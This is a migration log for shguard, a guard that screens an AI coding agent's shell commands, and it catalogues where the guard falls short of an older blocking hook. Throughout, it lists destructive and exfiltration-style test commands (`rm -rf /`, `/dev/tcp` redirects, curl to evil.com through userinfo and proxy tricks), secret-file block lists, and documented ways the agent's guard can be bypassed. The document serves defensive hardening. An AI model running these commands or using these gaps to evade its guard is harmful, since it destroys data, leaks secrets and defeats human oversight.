# shguard migration: accepted behavior deltas

Tracks every place where `claude-code/shguard/config.toml` (+ shguard's
built-in blocklist) does **not** reproduce `block-dangerous.sh` +
`blocklist.conf` + `allowlist.conf`'s behavior exactly, per
`claude-code/rules/security.md`'s "a weakened control must be visible, not
silent" requirement. Written during the migration plan at
`.claude/plans/https-github-com-tsukasai-shguard-hook-b-stateless-sloth.md`
(step 4); update it whenever a new gap is found or an upstream fix lands.

Status legend: **gap (permanent)** — not expressible in shguard's current
rule schema, no upstream ask filed; **gap (pending upstream)** — tracked as
a filed issue, closes automatically once fixed; **regression (pending
upstream)** — old behavior was strictly safer, also tracked upstream;
**design change (net improvement)** — behavior differs but isn't a
weakening, documented so it isn't mistaken for a bug later.

## Summary table

| # | Area | Status | Tracking |
|---|------|--------|----------|
| 1 | Malformed-input fail-closed mode | regression (minor) | not filed — see below |
| 2 | curl (localhost-only) / rsync (local-only) | **mostly resolved** — rules live in `config.toml`; residual sub-gaps in #23 | [shguard#48](https://github.com/tsukasaI/shguard/issues/48) fixed |
| 3 | Pipe-to-interpreter beyond curl\|wget→sh | **resolved, doc was stale**: a generic engine floor now `ask`s for any pipeline sink with no decode stage, not just the hardcoded shell list | confirmed live 2026-09-02 against HEAD `a4fbd14`, no issue needed |
| 4 | Heredoc-fed interpreters (`python <<EOF`) | gap (permanent), confirmed live 2026-09-02: heredoc body content isn't scanned at all, reaches bare `allow` | [shguard#424](https://github.com/tsukasaI/shguard/issues/424) filed |
| 5 | ANSI-C `$'...'` raw-string check | gap (permanent) | not expressible |
| 6 | `/dev/tcp` \| `/dev/udp` (command-agnostic) | gap (permanent, partial), confirmed live 2026-09-02: reaches `ask` via unsupported-construct fallback, not an explicit `deny` | [shguard#425](https://github.com/tsukasaI/shguard/issues/425) filed |
| 7 | CREDENTIAL: any-command bare-word match | gap (permanent, partial), confirmed live 2026-09-02: reaches bare `allow`, no ask/deny at all | [shguard#426](https://github.com/tsukasaI/shguard/issues/426) filed |
| 8 | `gh api -X DELETE` chained-value form | gap (permanent, partial) | not expressible |
| 9 | Secret-file readers: extension-suffix / nested paths | gap (permanent, partial), confirmed live 2026-09-02: `.env` suffix variant under a nested path (`foo/.env.local`) is a real regression (old hook covered it); bare extension-suffix (`id_rsa.bak`) is a pre-existing hole, not a regression | [shguard#427](https://github.com/tsukasaI/shguard/issues/427) filed (`.env` case only) |
| 10 | `--no-verify` on non-git commands | gap (permanent, minor) | not expressible |
| 11 | `sudo`/`doas`/`su`/`pkexec`/`run0` privilege escalation | **resolved** — `escalation_floor = "deny"` | [shguard#35](https://github.com/tsukasaI/shguard/issues/35) closed, v0.3.0 |
| 12 | `bash`/`sh`/`zsh`/`dash -c` unwrap-recursion | design change (net improvement) | n/a |
| 13 | Symlinked config: Bash-write self-protection | **resolved** (ticket bookkeeping still open, fix merged) | [shguard#31](https://github.com/tsukasaI/shguard/issues/31) fixed, v0.3.0 |
| 14 | Command-position variable expansion → Ask | design change (more cautious) | n/a |
| 15 | `git commit -uno` false positive (built-in short-flag clustering) | gap (permanent, minor) | shguard's own documented limitation |
| 16 | dotfiles issue #44 (multi-line `STRICT_CB` bypass) | **closed** by shguard | n/a — confirmed via parity check |
| 17 | `doas`/`su`/`pkexec` payload-shielding (shguard#36) | assessed — not a gap here | [shguard#36](https://github.com/tsukasaI/shguard/issues/36) fixed in v0.3.0 (ticket open — same multi-issue auto-close quirk as #31) |
| 18 | Missing/dangling default config path silently drops all user rules | **resolved** for dangling symlinks; residual gap for a clean absent-file case | [shguard#39](https://github.com/tsukasaI/shguard/issues/39) fixed, v0.3.0 |
| 19 | `except_targets` treats flag values as candidate targets — 55% over-ask on real local curl usage | **resolved** — `value_flags` field | [shguard#48](https://github.com/tsukasaI/shguard/issues/48) fixed |
| 20 | Parser can't parse `2>&1`/for/while/until/function-defs/`$?`/subshells — falls back to blanket `ask`, rule engine never runs | **resolved** | [shguard#75](https://github.com/tsukasaI/shguard/issues/75) fixed |
| 21 | `git grep` bare-command match doesn't cover git subcommand form | **resolved, doc was stale**: `git_strip_global_flags` now resolves `git -C <dir> grep` to the same `grep` subcommand match as bare `git grep` | confirmed live 2026-09-02 against HEAD `a4fbd14`, no issue needed |
| 22 | `git commit -m "$(...)"` (heredoc-style commit messages) now `ask`s instead of `allow`s | **resolved** — no longer the cutover blocker (superseded by #23/#24) | [shguard#146](https://github.com/tsukasaI/shguard/issues/146) fixed |
| 23 | curl userinfo-URL bypass (`localhost:` as userinfo, not port) + rsync bare-relative-path over-block | **userinfo bypass resolved** (`url_host` matcher replaces `exact`/`prefix` in `except_targets`, fable-reviewed 2026-08-24 — pending manual apply, `config.toml` is Claude-edit-blocked); rsync sub-gap still friction only, not fixable from `config.toml` | [shguard#147](https://github.com/tsukasaI/shguard/issues/147) open upstream (P2, real fix path via `url_host` now exists — this repo just needs to apply it); rsync sub-gap not filed |
| 24 | `if`/background job (`&`)/`[[ ]]`/`!` hit the same parse-failure-bypasses-rule-engine path as #20 — #75's fix didn't cover them | **resolved** — confirmed both by the closed ticket and live: zero "unsupported construct" parse failures in the shadow log (`~/.local/share/shguard-shadow/shadow.jsonl`) since the 2026-08-23 `darwin-rebuild switch` onto shguard 0.6.0, vs. 5+ occurrences of "if clause" alone before that switch | [shguard#191](https://github.com/tsukasaI/shguard/issues/191) closed 2026-08-15 |
| 25 | curl glued proxy flag (`-xhttp://evil.com`) bypasses the localhost-only rule entirely | **resolved** — `attached_value_flags = ["x"]` applied | [dotfiles#49](https://github.com/tsukasaI/dotfiles/issues/49) fixed, pending manual close |

## 1. Malformed-input fail-closed mode

`block-dangerous.sh` hard-blocks (exit 2, no override) on malformed JSON,
a non-string `command` field, or any other unhandled parse failure.
shguard's fail-closed path returns `ask` instead — a confirmation dialog a
hurried human can click through, rather than an unconditional block.
Minor, but real: the failure mode went from "cannot proceed" to "can
proceed with one extra click."

## 2. curl (localhost-only) / rsync (local-only)

Not present in `config.toml` at all — deliberately deferred. The old hook
allowed `curl`/`rsync` freely to local targets but asked/blocked for
remote ones; shguard's `[[allow]]` can only downgrade its own structural
`Ask`, never a config-defined `ask`/`deny` match, so a broad-ask + narrow-
allow approximation doesn't work (verified: it would make *every* curl,
including localhost, ask).

**Update: the original blocker (`except_targets` not existing,
[shguard#30](https://github.com/tsukasaI/shguard/issues/30)) is closed
and the primitive works.** But writing the rules with it surfaced a new,
more severe problem: see #19 below — `except_targets` treats flag values
as candidate targets, causing a 55% over-ask rate on real local curl
usage. That was the actual blocker
([shguard#48](https://github.com/tsukasaI/shguard/issues/48)), not #30.

**Mostly resolved.** shguard#48 landed upstream via a new `value_flags`
field (declare which flags take a value; their value is excluded from
the candidate-target set entirely). `config.toml` now carries
`dotfiles-network-curl-remote` / `dotfiles-network-rsync-remote`,
verified live to match `block-dangerous.sh`'s old behavior for the
cases exercised in `tests/shguard-parity-check.sh`: localhost/127.0.0.1/
`[::1]` curl targets allow (including with `-o`/`-X`/`-d`/`-H` and other
value-taking flags), a mixed localhost+remote invocation denies, a
subdomain-spoof (`localhost.evil.com`) denies, local-to-local rsync
(with a `./`/`../`/`~`-prefixed path, including with `--exclude=`)
allows, and remote rsync denies.

**Not exact parity, though** — a fable review (2026-08-06) found two
residual sub-gaps: a userinfo-URL bypass (`curl http://localhost:@evil.com`
allowed when it should deny — a real exfiltration vector, not just
friction), **resolved 2026-08-24 via the `url_host` matcher, see #23
below**, and an rsync over-block on bare relative paths
(`rsync -a src/ dst/` now denies where the old hook allowed it), still
open — neither fixable from a tighter `except_targets` string-match list.
A follow-up fable review (2026-08-24) also found a third, previously
undocumented gap in this same rule area: a glued curl proxy flag
(`-xhttp://evil.com`) bypasses the rule entirely — see #25 below. All are
locked in as `KNOWN_DELTA` (or, once resolved, plain) cases in
`tests/shguard-parity-check.sh` rather than left silently uncovered.

## 3. Pipe-to-interpreter beyond curl\|wget→sh

`block-dangerous.sh` blocks piping *anything* into
`bash|sh|zsh|dash|fish|ksh|python|python3|node|perl|ruby|php` (e.g.
`cat script.sh | bash`, `echo ... | python3`). shguard's `[[pipeline]]`
rule type (which is how this class of shape is matched) is **built-in
only** — the README states pipeline-shape rules aren't user-configurable —
and the built-in blocklist only ships one pipeline rule:
`curl|wget -> sh|bash|zsh`. Any other source piped into an interpreter is
unblocked. No workaround exists within the current schema.

## 4. Heredoc-fed interpreters

`block-dangerous.sh` blocks `python <<EOF ... EOF` (and the same for
node/perl/ruby/php) — a script body fed via heredoc, bypassing argv
inspection. shguard's rule schema has no redirect-input (`<<`) matcher; a
plain `python <<'EOF'` normalizes to what looks like a bare `python`
invocation to the rule engine, which is intentionally allowed (matches
`python script.py`). Blanket-denying `command = "python"` isn't an option
either — it would also block ordinary script execution the old hook always
allowed.

## 5. ANSI-C `$'...'` raw-string check

`block-dangerous.sh` scans the **raw**, unstripped command string for
`$'...'` sequences (deliberately, since quote-stripping would erase them)
to catch obfuscated payloads like `$'\x72\x6d' -rf /`. shguard has no
raw/decoded-content matcher in its rule schema — its normalization
(handled by real parsing rather than regex) already resolves `$'...'`
content before rule matching runs, but there's no way to write a user rule
that inspects the pre-normalization raw text the way the old hook's
special case did.

## 6. `/dev/tcp` / `/dev/udp` (command-agnostic)

`block-dangerous.sh` blocks any command referencing `/dev/tcp` or
`/dev/udp` (bash's pseudo-device network redirection), regardless of which
command it's attached to (`exec 3<>/dev/tcp/host/port`,
`cat < /dev/tcp/host/port`, etc.) — this is bash redirect syntax, not tied
to one command name. `config.toml` has no rule for this at all: a
command-agnostic "target contains /dev/tcp regardless of command" rule
isn't expressible (every `[[deny]]` requires a `command`/`command_prefix`).
A future partial mitigation would be per-command rules for the most likely
carriers (`exec`, `cat`, `echo`, `printf`) but that's not a full port
either — not yet added.

## 7. CREDENTIAL: any-command bare-word match

The old rule matched a bare `secret`/`secrets`/`credential`/`credentials`
word-boundary token on **any command** (`docker secret ls`,
`kubectl get secrets`, and implicitly anything else — `aws secretsmanager
get-secret-value`, `vault kv get secret/foo`, `op item get`, etc.).
shguard rules require a fixed `command`/`command_prefix`, so only the two
concrete examples the old rule's own comment called out
(`docker secret`, `kubectl secret`/`secrets`) are ported
(`dotfiles-credential-docker-secret`, `dotfiles-credential-kubectl-secret`,
`dotfiles-credential-kubectl-secrets`). Any other CLI's secret-manager
subcommands are now unblocked unless they separately trip a different rule
(e.g. a matching secret-file-reader target).

## 8. `gh api -X DELETE` chained-value form

`dotfiles-github-api-delete-upper`/`-lower` catch the separate-token forms
(`-X DELETE`, `--method DELETE`, case variants) via `required_tokens`. They
do **not** catch the chained forms `--method=DELETE` or `-XDELETE`, since
`required_tokens` matches whole argv tokens exactly and `DELETE` isn't a
standalone token in `--method=DELETE`.

## 9. Secret-file readers: extension-suffix / nested paths

`dotfiles-secret-read-{cat,head,tail,less,more,bat,nano,vim,nvim}` port the
same 9 reader commands the old `SECRET_READ_RE` covered, but only for a
subset of target patterns — common bare filenames/prefixes
(`.env*`, `id_rsa`/`id_ed25519`/`id_ecdsa`/`id_dsa`, `kubeconfig`,
`.npmrc`, `.netrc`, `.pgpass`, `.aws/`, `.docker/config.json`,
`.config/gcloud/`). shguard's `targets` matcher only supports `exact`/
`prefix` on the whole argv token, so two classes of pattern from the old
regex are **not** covered:

- Extension-suffix patterns (`*.pem`, `*.key`, `*.p12`, any-extension
  `secret*`/`credential*` files) — there's no suffix/contains matcher.
- **Any directory-prefixed path, for every target, not just the `exact`
  ones.** An earlier version of this note claimed `cat ./nested/dir/.env`
  still matched via the `.env` `prefix` rule — that was wrong, verified
  live: it's `allow`. `prefix` matches from the start of the *token*, and
  `./nested/dir/.env` doesn't start with `.env` — it starts with `./`. So
  `cat ./nested/dir/.env` (a very ordinary way to reference a project
  `.env` file one directory down) is just as uncovered as
  `cat ./nested/dir/id_rsa`. This is a materially bigger gap than
  originally recorded — it's not limited to the `exact`-matched targets.

## 10. `--no-verify` on non-git commands

The old rule (`*--no-verify*`) was a command-agnostic substring match —
any command with `--no-verify` anywhere, not just git. shguard's built-in
`git-no-verify-any-subcommand` only fires for `command = "git"`. A
hypothetical non-git CLI accepting a `--no-verify`-style flag is no longer
caught. Low practical impact (no other tool in this workflow is known to
use that flag), but real.

## 11. `sudo`/`doas`/`su`/`pkexec`/`run0` privilege escalation — resolved via `escalation_floor`

History, for context: `sudo <cmd>` was found to be evaluated by shguard
recursing into `<cmd>`'s own safety rather than matching
`argv[0] = "sudo"` literally — `sudo whoami` → allow, `env sudo ls` →
allow, even though `dotfiles-privilege-sudo` (a plain `command = "sudo"`
deny rule) exists in `config.toml`. The old hook blocked **every** `sudo`
invocation unconditionally, since privilege escalation itself was the
concern, independent of the wrapped command's content. `doas`/`su` were
**not** given this unwrap treatment at the time — the equivalent rules
for those worked exactly as expected on their own.

v0.2.0 (shguard#32) fixed the unwrap-recursion to floor at **Ask** rather
than silently allowing, but a blanket `[[deny]] command = "sudo"` stayed
unreachable — that gap was split into shguard#35 (a floor-strength config
key). Separately, shguard#36 found that `doas`/`su`/`pkexec` had the
*opposite* problem: not unwrapped at all, so a rule targeting the wrapped
command never saw it through them.

**Resolution (v0.3.0, shguard#35's fix covering #36 as well): a single
`escalation_floor` config key.** (Ticket note: #35 is closed; #36's
ticket still shows open — verified via `gh issue view` — but the fix is
confirmed merged and working below, the same multi-issue auto-close
quirk already documented for #31.)

```toml
escalation_floor = "deny"  # default is "ask"; "allow" is rejected at load
```

Verified live: `sudo whoami` and `doas whoami` both now **deny**
outright (not just Ask) with this key set; `escalation_floor = "allow"`
is correctly rejected at config load (fail-closed, no way to disable the
floor). It covers `sudo`, `doas`, `su`, `pkexec`, and `run0` uniformly.

**Important nuance, confirmed live and corrected from an earlier draft
of this entry**: with this repo's full `config.toml` (floor *and* the
`dotfiles-privilege-sudo`/`-su`/`-doas` rules both present), the reported
deny reason for `sudo`/`doas`/`su` is the **rule** matching
("matches blocklist rule \"dotfiles-privilege-sudo\": ..."), not the
floor's own message — because those three rules match unconditionally
on `argv[0]` and so always fire alongside the floor. The floor's own
message ("invoked via pkexec; privilege escalation is gated independent
of...") only surfaces for vectors this repo has **no** rule for
(`pkexec`, `run0` — verified live with `pkexec whoami`) or in a config
that lacks the redundant rules entirely. Net effect is identical either
way (deny), but the earlier claim that the floor's reason always wins
was wrong — worth getting right since it affects how to read shguard's
output when debugging. The three rules genuinely are redundant with the
floor in place (removing them would change nothing for sudo/doas/su
specifically), just not in the way originally described. Kept in
`config.toml` anyway (harmless, and documents intent), rather than
removed.

## 12. `bash`/`sh`/`zsh`/`dash -c` unwrap-recursion (net improvement, not a gap)

Same unwrap-recursion mechanism as #11, but here it's a strict improvement
over the old hook for the `-c` case specifically, not a regression: the old
hook blanket-blocked **every** `bash -c`/`sh -c`/`zsh -c`/`dash -c`
regardless of content (it had no way to statically verify what was
inside). shguard actually parses and judges the inner command — confirmed
`bash -c 'rm -rf /'` → deny (via the built-in rm-rf rule), `bash -c 'grep
foo bar'` → deny (via `dotfiles-tool-policy-grep`, i.e. **user** rules
apply recursively too, not just built-ins), `bash -c 'echo hi'` → allow
(where the old hook denied unconditionally).

`config.toml`'s `dotfiles-code-{bash,sh,zsh,dash}` rules are **blanket**
(no `required_flags = ["c"]`), not `-c`-scoped — an earlier draft of this
port had `-c`-scoped versions and reasoned the whole category was
unreachable dead code, which was wrong: the `-c` shape is superseded by
recursion (a `required_flags=["c"]` rule genuinely never fires), but bare
`bash script.sh` (a script *file* reference, no inline content to recurse
into) is a different shape that recursion does **not** cover — shguard
doesn't read the referenced file. That shape was silently uncovered until
the parity check caught it (`ba'sh' script.sh` → allow). The blanket rule
fixes that without breaking `-c` recursion (verified: `bash -c 'echo hi'`
still allows with the blanket rule present) and, as a side effect, closes
dotfiles issue #44 — see #16 below. `ksh -c`/`fish -c` are **not** unwrapped
(brush-parser doesn't parse those dialects), so `dotfiles-code-ksh-c`/
`dotfiles-code-fish-c` keep their narrower `-c`-scoped form and work as
plain rules.

## 13. Symlinked config: Bash-write self-protection gap — resolved

`claude-code/shguard/config.toml` is deployed via a `setup.sh` symlink to
`~/.config/shguard/config.toml` so the policy stays versioned and
CI-testable (migration plan step 2). shguard's own `self_protection_toml`
matched only the *resolved* path; a Bash write targeting the repo-side
real file directly (`echo ... > claude-code/shguard/config.toml`, `tee`,
`cp`) was caught by neither shguard's self-protection nor
`block-config-edit.sh` (which only gates the Edit/Write tool, not Bash).
Confirmed live during this migration (pre-fix) that a `cp` to that path
from an agent session would succeed. Filed as
[shguard#31](https://github.com/tsukasaI/shguard/issues/31).

**Resolved in v0.3.0.** `src/config.rs`'s self-protection now
canonicalizes the config path and protects both the literal parent
directory and the canonicalized/resolved target's parent directory.
Verified live with a real symlink setup matching this repo's deployment
shape: a `tee` targeting the repo-side real file now correctly denies
(`shguard-self-protect-config-tee-resolved`), same as the symlink path
itself. Note: the GitHub *ticket* for #31 still shows OPEN — its closing
PR referenced multiple issues in one line and GitHub only auto-closed
the first — but the fix is confirmed merged and working; close the
ticket manually with this verification note when convenient. Known
residual limitation (new shguard#44, not blocking): a symlink chain of
2+ hops only gets its first and last hop protected, not any intermediate
hop — irrelevant to this repo's single-hop deployment.

## 14. Command-position variable expansion → Ask (more cautious, not a gap)

`"$HOME/dotfiles/setup.sh" --help` → old hook: allow (no blocklist pattern
matches an unresolvable variable expansion, so it silently falls through).
shguard: **ask** — its structural gate treats an unresolvable command-position
substitution (`$VAR`, `$(...)`, backticks — "which command will run cannot
be determined statically") as needing confirmation, per its own documented
design. Not a config bug, not fixable in `config.toml`, and arguably safer
than the old hook's silent allow — listed here so a future reader doesn't
mistake the extra prompt for a regression.

## 15. `git commit -uno` false positive (shguard's own built-in limitation)

`git commit -uno -m "x"` → old hook: allow (cluster-aware — recognizes
`-u` takes an argument, so the `n`/`o` after it aren't independent short
flags). shguard's **built-in** `git-commit-no-verify-short` rule
(`required_flags = ["n|--no-verify"]`) denies this — its short-flag-cluster
matching reads `-uno` as containing a clustered `-n`, missing that `-u`
takes a value. This is already documented as a known limitation in
shguard's own `rules/blocklist.toml` comment ("Known false-positive edge:
a `-m` message argument starting with `-` and containing `n` may trigger,
same class of imprecision as the dotfiles hook") — not something this
migration introduced or can fix from the user-config side. Not filed as a
new upstream issue since it's already acknowledged upstream.

## 16. dotfiles issue #44 (multi-line `STRICT_CB` bypass) — closed

Not to be confused with shguard's own upstream issue #44 (a different,
unrelated symlink-hop limitation — see #13 above). This is this repo's
own issue tracker.

The migration plan speculated shguard's real AST parsing "likely closes
[this repo's issue #44] as a side effect" and asked to confirm rather
than assume.
Confirmed via the parity check, **after** adding the blanket
`dotfiles-code-{bash,sh,zsh,dash}` rules (#12): `echo setup` + newline +
`bash script.sh` → shguard denies (via `dotfiles-code-bash` matching the
second command), while the live `block-dangerous.sh` still allows it (the
open bug — `STRICT_CB`'s boundary class doesn't treat a bare newline as a
separator). shguard's real parser splits the newline-separated command
list into independent commands and evaluates each, which is exactly the
class of bug `STRICT_CB`'s regex-based boundary matching can't express.
Recorded on the issue itself when this migration reaches cutover.

## 17. `doas`/`su`/`pkexec` payload-shielding (shguard#36) — assessed, not a gap here

Found upstream while fixing #32: `doas`, `su`, and `pkexec` aren't in
shguard's `TRANSPARENT_WRAPPERS` list, so unlike `sudo` they're never
unwrapped at all — a rule targeting the *wrapped* command never sees it
(`doas rm -rf /` → allow, since the `rm` rule only ever sees `argv[0] =
"doas"`, not `rm`). Assessed against this config specifically: **not a
problem here**. `dotfiles-privilege-doas`/`dotfiles-privilege-su` are
blanket `command = "doas"`/`command = "su"` deny rules with no flag/token
constraint — they deny the wrapper itself unconditionally, regardless of
what it wraps, so they never depended on the wrapped command being
visible in the first place. `pkexec` has no rule in `config.toml` at all,
but it's a Linux polkit tool with no equivalent on this macOS machine —
low relevance, not acted on. No config change needed; recorded here so a
future reader checking shguard#36 against this repo doesn't have to
re-derive that it's already covered.

**Update: fixed in v0.3.0 as part of the `escalation_floor` key** (see
#11 above) — `doas`/`su`/`pkexec`/`run0` are now covered by the same
floor mechanism `sudo` is, in addition to this repo's own blanket rules
already covering the assessment above. Belt and suspenders now, not a
live gap either way. (Ticket note: verified via `gh issue view 36` that
the GitHub ticket is still open despite the fix being merged and
verified live — same multi-issue auto-close quirk documented for #31;
not re-derived as a live problem here.)

## 18. Missing/dangling default config path silently drops all user rules

Found via an independent security review (2026-07-21), not by manual
testing during the original port. Verified live: when the resolved
default config path (`~/.config/shguard/config.toml`, no `$SHGUARD_CONFIG`
override) is missing or a dangling symlink, shguard does **not** fail
closed — it silently evaluates against the built-in blocklist only, with
no indication every `dotfiles-*` rule has been dropped:

```
echo '{"tool_name":"Bash","tool_input":{"command":"grep foo bar"},"hook_event_name":"PreToolUse"}' \
  | HOME=/tmp/nonexistent-home shguard
# -> allow ("command cleared all checks") — grep has no built-in rule,
#    only dotfiles-tool-policy-grep, which was silently skipped
```

This is asymmetric with the *explicit*-path case: `SHGUARD_CONFIG=/does/not/exist`
correctly fails closed (`ask`, "refusing to evaluate any command until
this is fixed"). The gap is specifically in the default-path discovery,
not the load-failure handling.

Realistic trigger for this repo's deployment (real file in-repo, symlinked
into `~/.config/shguard/`, migration plan step 2): a repo move/rename, a
partial fresh-machine `setup.sh` run (known-fragile, issue #5), or
accidental deletion of the real file all leave the symlink dangling.
Every user rule not already in the built-in blocklist — `su`/`doas`,
`ssh`, `kill`, secret-file readers, `TOOL_POLICY`, everything — stops
applying, silently.

Filed as [shguard#39](https://github.com/tsukasaI/shguard/issues/39).

**Resolved in v0.3.0, for the realistic trigger — with one residual
gap.** The default-path check now uses `symlink_metadata` (`lstat`)
instead of trusting a plain read error: a dangling symlink or any other
`lstat` failure now correctly fails closed to `ask`, matching the
explicit-`$SHGUARD_CONFIG` behavior — verified live (a dangling symlink
at the resolved config path now returns `ask`, not silent built-in-only
`allow`). This closes the realistic trigger described above (repo
move/rename, partial `setup.sh` run, deleted real file — all produce a
dangling symlink). **Residual gap, not closed by this fix**: a clean
`lstat` `NotFound` (nothing at that path at all, e.g. a genuinely fresh
machine where `setup.sh` hasn't run yet and no symlink exists) still
silently falls back to built-in-only. Narrower than originally recorded,
still real.

## 19. `except_targets` treats flag values as candidate targets — resolved via `value_flags`

**Resolved.** shguard added an opt-in `value_flags` field: declare which
flags take a value (`value_flags = ["o", "w", "m", ...]` for curl) and
that value — separated or `--name=value` attached — is excluded from the
candidate-target set entirely, never checked against `except_targets`.
Verified live against `config.toml`'s final curl/rsync rules (see #2
above and `tests/shguard-parity-check.sh`): the exact 6-of-11 over-ask
cases originally measured now all `allow`. History of the defect, for
context:

Writing the curl-localhost-only / rsync-local-only rules (deferred since
#2 above) surfaced a new, more severe problem than #30 (`except_targets`
not existing) ever was. Measured against 24 real `curl` invocations
mined from ~1 month of session transcripts
(`~/.local/share/claude-logs/logs.db`), using the exact `except_targets`
config from shguard's own README example plus scheme-less anchors:

- 11 of 24 targeted `localhost`/`127.0.0.1` — should always be `allow`.
- **6 of those 11 (55%) instead got `ask`** — every miss caused by a
  value-taking flag (`-o`, `-w`, `--retry-delay`, `-m`, or piped output)
  being evaluated as a candidate target, not the actual URL.
- The identical defect affects `rsync`: a purely local-to-local
  `rsync -a --exclude=".git" ./src/ ./dst/` also asks, since `.git`
  isn't an exempted target either.

This can't be fixed by enumerating more `except_targets` entries — flag
values (filenames, format strings, timeouts, exclude patterns, request
bodies) are unbounded. Filed as
[shguard#48](https://github.com/tsukasaI/shguard/issues/48). **This is
now the actual blocker on curl/rsync rules, not #30** (which is closed
and works correctly for the cases it covers — the primitive itself is
fine, this is a separate target-detection defect). Both commands remain
on `block-dangerous.sh`'s existing logic until #48 lands; shipping
either `[[ask]]` or `[[deny]]` on top of a 55% false-positive rate on
routine local usage would be a regression, not a parity port.

## 20. Parser construct-support gaps mask the entire rule engine — the largest gap found, now resolved

**Resolved.** shguard#75 landed upstream ("feat(gate): model for/while/until,
subshells, function defs, and other issue #75 constructs") and is
verified live against the installed binary: `rm -rf /tmp/x 2>&1` and a
`for`-loop wrapping `rm -rf` — both examples of the 84 real commands the
old hook denied but shguard used to wave through as a dismissible `ask`
— now correctly `deny` via the normal rule engine. Locked in as
permanent regression cases in `tests/shguard-parity-check.sh`.

**Note on the installed binary's version string**: `shguard --version`
reports `0.3.0` even when built from a commit well past that tag (the
fix for this and #48 both landed after the v0.3.0 release tag but
before the flake-pinned commit) — don't trust the version string alone
to judge whether a fix has landed; check the actual pinned commit
against the issue's closing commit instead.

Found via the shadow-log observation period (2026-07-20 to 2026-07-31,
`claude-code/hooks/shguard-shadow.sh`, migration plan step 5): every real
Bash command across all Claude Code sessions on this machine was replayed
live through both `block-dangerous.sh` and shguard. Of 3576 captured
commands, 1083 (30%) hit an "unsupported construct" parse failure in
shguard, on which it returns a blanket `ask` **without ever running its
rule engine** — built-in or `dotfiles-*` rules alike see nothing.

Breakdown of the 1083: redirection kind DuplicateOutput (`2>&1` etc.) = 836,
`for` clause = 73, special parameter expansion (`$?` etc.) = 66, function
definition = 55, `while` clause = 25, subshell `(...)` = 10, array
assignment = 4, timed pipeline (`time`) = 3, arithmetic expansion
`$((...))` = 3, `until` clause = 2, process substitution = 2.

Of those, 999 were pure friction (old hook allowed; shguard now asks for
nothing). But **84 were commands the old hook actually denied** — verified
live:

```
for f in *; do rm -rf "$f"; done   -> old: deny (exit 2)   shguard: ask
rm -rf /tmp/x 2>&1                 -> old: deny            shguard: ask
```

An obviously catastrophic pattern, merely wrapped in an ordinary `for`
loop or suffixed with `2>&1`, downgrades from an unconditional block to a
dismissible confirmation dialog.

This is intentional in shguard (`src/gate.rs`: parse error -> immediate
Ask, no partial evaluation) and documented in its own `plan.md` as
covering only "exotic" syntax — real traffic disproves that framing
(`2>&1` alone is 23% of all commands captured). Independently verified
live by a second reviewer (additional cases: `curl evil.com 2>&1`, `sudo
rm -rf / 2>&1`, a `while` loop wrapping `rm -rf` — all confirm the same
parse-error -> Ask -> rule engine never runs path). Not filed upstream as
of the original finding (checked all open issues + `gh search issues` on
`tsukasaI/shguard`); now filed as
[shguard#75](https://github.com/tsukasaI/shguard/issues/75). Unlike
every other item in this doc, this is not a rule-schema expressiveness
limit — brush-parser (shguard's parsing dependency, 0.4.0) already
produces typed AST nodes for these constructs; shguard's own
`src/parser.rs` just declines to translate them. This is the largest gap
found by real-traffic volume (30% of all commands, vs. this doc's
next-largest single item, #19, at 55% over-ask on curl specifically) and
on its own severity should gate full cutover alongside #19.

## 21. `git grep` not covered by the grep tool-policy rule

The old hook's `TOOL_POLICY` rule matches the bare word "grep" anywhere
in the command line via regex, so it also fires on `git grep ...`.
shguard's `dotfiles-tool-policy-grep` is `command = "grep"` (argv[0]
exact), which doesn't fire when grep is invoked as a git subcommand.
Fixed via a `dotfiles-tool-policy-git-grep` rule (`command = "git"` +
`required_tokens = ["grep"]`, verified live to correctly ignore `git log
--grep=` and commit messages mentioning grep — `required_tokens` matches
positionally, not via substring, so it doesn't false-positive the way
the old hook's bare-word scan could). Residual gap: `git -C <dir> grep
...` still isn't caught — a non-flag token before the subcommand breaks
shguard's positional `required_tokens` matching, a known shguard
limitation, not expressible from the config side.

## 22. `git commit -m "$(...)"` (heredoc-style commit messages) now asks instead of allows — resolved

Found while writing the shguard-based replacement for
`tests/hooks-regression.sh` (the full-cutover work), independent of
every other gap catalogued in this doc so far. This repo's own
`CLAUDE.md` mandates a heredoc-style `-m` for every commit
(`git commit -m "$(cat <<'EOF' ... EOF)"`, so multi-line messages
survive quoting safely) — a pattern used on effectively every commit
made in this repo.

Verified live: the built-in `git-commit-no-verify-short` rule
(`required_flags = ["n|--no-verify"]`) tries to check whether
`-n`/`--no-verify` is present in the command; when the `-m` argument
contains an unresolved command substitution, it can't fully verify past
that and falls back to a cautious `ask` — reason string: "command
matches blocklist rule 'git-commit-no-verify-short', but a required
flag/token could not be fully checked because an argument is an
unresolved $VAR or command substitution". Minimal repro:

```
echo '{"tool_name":"Bash","tool_input":{"command":"git commit -m \"$(echo hi)\""},"hook_event_name":"PreToolUse"}' | shguard
# -> ask (a plain quoted -m "message" with no substitution allows fine)
```

**Not fixable from `config.toml`.** Tested adding an `[[allow]]` rule
(`command = "git", required_tokens = ["commit"]`) — no effect. Unlike
delta #14's command-position unresolvable-substitution case (which
`[[allow]]` *can* downgrade, per the README's documented mechanism),
this ask is tied to the `git-commit-no-verify-short` rule's own
match-attempt, a different internal path shguard's `[[allow]]`
precedence doesn't reach.

Net effect while open: every commit made via the mandated heredoc
pattern got one extra confirmation click. Not a security regression
(more cautious, not less) — a real, daily-workflow friction cost across
every commit, not an edge case. This is why full cutover (the
`settings.json` swap to `shguard-gate.sh`) was paused. Filed as
[shguard#146](https://github.com/tsukasaI/shguard/issues/146).

**Resolved 2026-08-06** (PR #148, "let heredoc/multi-line git commit -m
messages resolve to Allow"), landed in the pinned commit before this
repo's flake update to the 2026-08-12 pin. Verified live against the
installed 0.4.0 binary: the exact repro above now `allow`s. This is no
longer a cutover blocker on its own — see #24 below for the finding
that replaces it as the active blocker, and #23 above for the other
live blocker (curl userinfo bypass).

## 23. curl userinfo-URL bypass (resolved) + rsync bare-relative-path over-block (still open)

Found by a fable code-review pass (2026-08-06) on the #2/#19 curl/rsync
rules above, before they were committed — verified live, not just read.
Two distinct sub-gaps in the same rules:

**Userinfo-URL bypass (security-relevant, not just friction) — resolved
2026-08-24.** The `except_targets` anchoring (`{ exact = "http://localhost" }`,
`{ prefix = "http://localhost:" }`, `{ prefix = "http://localhost/" }`,
same for 127.0.0.1/`[::1]`/https) was plain string prefix matching with
no URL-authority parsing. curl treats `user:password@host` as
userinfo, not a port, so a colon right after `localhost` was
indistinguishable from a real `:port` to a prefix match:

```
